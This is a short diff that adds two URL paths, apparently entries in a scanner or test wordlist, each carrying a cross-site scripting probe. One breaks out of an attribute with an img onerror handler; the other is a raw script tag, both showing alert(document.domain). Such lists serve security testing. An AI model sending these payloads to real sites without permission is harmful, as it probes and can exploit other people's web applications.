@@ -1,0 +1,3 @@
+
+/keepalive.php?caller=%22%3E%3Cimg+src%3d1+onerror%3dalert(document.domain)+%2F%3E&uq_mt=1664137650.085
+/api/api.php/<script>alert(document.domain)</script>
